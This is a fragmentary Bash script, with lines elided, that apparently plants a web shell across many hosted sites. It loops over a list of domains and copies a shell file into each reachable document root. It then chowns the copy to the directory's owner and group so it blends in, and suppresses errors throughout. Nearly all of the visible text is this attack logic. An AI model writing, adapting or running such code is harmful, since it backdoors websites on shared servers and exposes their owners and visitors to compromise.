...
for domain in "${domains_list[@]}"; do
    ...
    if [ $accessible -eq 1 ]; then
        ...
        if cp "$SHELL_FILE" "$shell_upload_path" 2>/dev/null; then
            ...
            dir_group=$(ls -ld "$doc_root" 2>/dev/null | awk '{print $4}')

            if [ -n "$dir_owner" ] && [ -n "$dir_group" ]; then
                chown "$dir_owner:$dir_group" "$shell_upload_path" 2>/dev/null
                echo "      Owner: $dir_owner:$dir_group"
            elif [ -n "$dir_owner" ]; then
                chown "$dir_owner" "$shell_upload_path" 2>/dev/null
